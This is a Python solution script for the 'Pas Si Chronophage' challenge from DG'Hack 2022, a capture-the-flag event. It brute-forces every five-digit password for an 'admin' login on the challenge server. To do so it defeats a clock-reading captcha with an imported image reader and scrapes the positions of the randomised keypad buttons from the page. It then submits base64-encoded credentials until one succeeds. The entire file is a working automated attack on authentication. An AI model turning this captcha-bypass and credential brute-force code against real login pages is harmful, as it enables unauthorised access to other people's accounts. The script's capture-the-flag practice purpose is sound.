"""
Pas Si Chronophage
- DG'Hack 2022
---

@author CorentinGoet
"""

import httpx
from PIL import Image
from io import BytesIO
import base64
import time
import sys

from captcha_reader import CaptchaReader

# target Parameters
url = "http://passichronophage.chall.malicecyber.com/"
header_login = {
    'Host': 'passichronophage.chall.malicecyber.com',
    'User-Agent': 'Mozilla/5.0(Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html, application/xhtml+xml, application/xml; q=0.9, image/avif, image/webp, */*;q=0.8',
    'Accept-Language': 'fr, fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '60',
    'Origin': 'http://passichronophage.chall.malicecyber.com',
    'Connection': 'close',
    'Referer': 'http://passichronophage.chall.malicecyber.com/index.php',
    'Upgrade-Insecure-Requests': '1'
}

header_get = {
    'Host': 'passichronophage.chall.malicecyber.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}


def main(begin: int = 0, end: int = 99999, step=1):

    print("#"*30)
    print("\tPas Si Chronophage...")
    print("by CorentinGoet")
    t_ini = time.time()
    int_password = begin
    err_type = 1    # response from server: 1 -> wrong credential, 2 -> wrong captcha
    nb_wrong_captcha = 0
    nb_tries = 0
    password_found = False
    while int_password <= end:
        login = "admin"
        with httpx.Client() as client:
            try:
                if err_type == 1:   # only change password if wrong credential
                    # Increment Password
                    int_password += 1
                    nb_tries += 1
                    password = str(int_password).rjust(5, "0")

                print('-'*30)
                print(f"Trying Credentials: {login}: {password}")

                # request captcha
                initial_request = client.get(url, headers=header_get)
                if initial_request.status_code == 506:
                    pass
                t0 = time.time()
                captcha_name = get_captcha_filename(initial_request.text)
                captcha_image = get_captcha_image(captcha_name, client)
                i = Image.open(BytesIO(captcha_image))
                #i.save("current_captcha.png")

                # Read button position
                button_pos = find_button_position(initial_request.text)
                print(f"Identified button positions: \n\t{button_pos}")

                # Read captcha
                print("Reading captcha...")
                reader = CaptchaReader(image=i)
                h, m = reader.read_time()
                print(f"Found: {h}:{m}")

                # Generate parameters
                params = generate_parameters(login, password, (h, m), button_pos)
                print(f"Generated parameters:\n\t{params}")

                # send login request
                print(f"Login Request sent in {time.time() - t0}")
                login_request = client.post(url+'login.php', data=params, headers=header_login)

                if login_request.status_code == 506:
                    pass

                if 'wrong_captcha' in login_request.headers['location']:
                    err_type = 2
                    nb_wrong_captcha += 1
                    print("WRONG CAPTCHA")
                elif 'wrong_credentials' in login_request.headers['location']:
                    err_type = 1
                    print("WRONG PASSWORD")
                else:
                    password_found = True
                    break

            except httpx.TimeoutException as e:
                print(f"Error: {e}")

            except ValueError:
                f = open(f"errors/value_error{password}.txt", "w")
                f.write(login_request.text)
                f.close()

            except KeyError:
                f = open(f"errors/key_error{password}.txt", "w")
                f.write(login_request.text)
                f.close()

            finally:
                client.close()

    if password_found:
        print(login_request.text)
        print(f"Password identified: {password}")
        f = open(f"passwords/password_{password}.txt", "w")
        f.write(password)
        f.close()
    else:
        print(f"No password found between: {begin} and {end}")
    print(f"Execution Time: {time.time() - t_ini}")
    print(f"Captcha reader performance: {round((nb_tries - nb_wrong_captcha) / nb_tries * 100, 2)}%")
    print("#" * 30)


def generate_parameters(login: str, password: str, time: tuple, positions: dict):
    """
    Generates the parameters to send with the login request.

    :param login: username
    :param password: password
    :param time: (h, m) hour minute (both int)
    :param positions: map of position of buttons + inputs
    :return: (login, password, captcha)
    """
    # login & password
    login = base64.b64encode(bytes(login, 'utf8'))
    password = base64.b64encode(bytes(password, 'utf8'))

    # captcha
    plaintext_captcha = str(int(time[0]/10)) + str(time[0] % 10) + str(time[1] // 10) + str(time[1] % 10)
    print(plaintext_captcha)
    input_captcha = ""
    for char in plaintext_captcha:
        input_captcha += positions[char]
    captcha = base64.b64encode(bytes(input_captcha, 'utf8'))
    return {'username': str(login, 'utf8'), 'password': str(password, 'utf8'), 'captcha': str(captcha, 'utf8')}


def find_button_position(page: str):
    """
    Finds the position of each button on the page
    """
    positions = {}
    i = 0   # reading pointer
    start_str = "addClickToInput"
    end_str = "\">"

    for _ in range(10):
        # identify string
        start_ind = i + len(start_str) + page[i:].index(start_str)
        end_ind = start_ind + page[start_ind:].index(end_str)

        # read
        data = page[start_ind: end_ind]
        value = data[1]
        pos = data[4]

        # add to map
        positions[value] = pos

        # update reading pointer
        i = end_ind

    return positions


def get_captcha_image(filename: str, client: httpx.Client):
    request = client.get(url+filename)
    return request.content


def get_captcha_filename(page: str):
    """
    Finds the name of the captcha image in the page.
    """
    start_str = "class=\"captcha-image\" src=\""
    end_str = "\" alt=\"captcha\">"
    ind_start = page.index(start_str)
    ind_end = page.index(end_str)

    filename = page[ind_start + len(start_str):ind_end]
    return filename


if __name__ == '__main__':
    if len(sys.argv) == 1:
        main()

    elif len(sys.argv) == 2:
        main(int(sys.argv[1]))

    elif len(sys.argv) == 3:
        main(int(sys.argv[1]), int(sys.argv[2]))

    elif len(sys.argv) == 4:
        main(int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3]))

    else:
        print(f"Usage: {sys.argv[0]} first_number last_number")